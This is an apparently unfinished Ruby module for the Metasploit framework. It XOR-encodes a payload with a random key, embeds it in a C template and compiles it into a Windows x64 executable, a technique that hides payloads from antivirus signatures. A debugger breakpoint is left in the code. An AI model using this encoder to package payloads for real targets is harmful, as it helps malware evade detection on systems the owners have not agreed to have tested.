require 'erb'
require 'metasploit/framework/compiler/mingw'
require 'metasploit/framework/compiler/windows'
require 'metasploit/framework/compiler/custom'
require 'pry'
require 'pry-byebug'

module Msf::Obfluscation::ExeTemplate
  
  def self.exe_template_compile(framework, code, opts)
    
    binding.pry 
    
    template_path = framework.datastore['EXE::Template::Dynamic::CustomTemplate']
    template_path ||= File.join(Msf::Config.data_directory, 'templates','template_x64_windows.erb')
    
    key = rand(256)
    control_byte = rand(256)
    
    code.prepend(control_byte.chr)

    payload_length = code.bytesize

    payload = code.bytes.map { |b| "\\x%02x" % (b ^ key) }.join
    encoded_first_byte = key ^ control_byte

    template = ERB.new(File.read(template_path))
    source_c = template.result(binding)

#    if framework.datastore['exe::template::dynamic::obfluscation']

   
    case framework.datastore['EXE::Template::Dynamic::Compiler']
    when 'metasm'
      return Metasploit::Framework::Compiler::Windows.compile_c(source_c, :exe,Metasm::X86_64.new)
    when 'msfcompile'
      return Metasploit::Framework::Compiler::Custom.compile_c(source_c, :exe)
    else
      raise "Unknown compiler: #{opts['EXE::Template::Dynamic::Compiler']}"
    end

  end

end
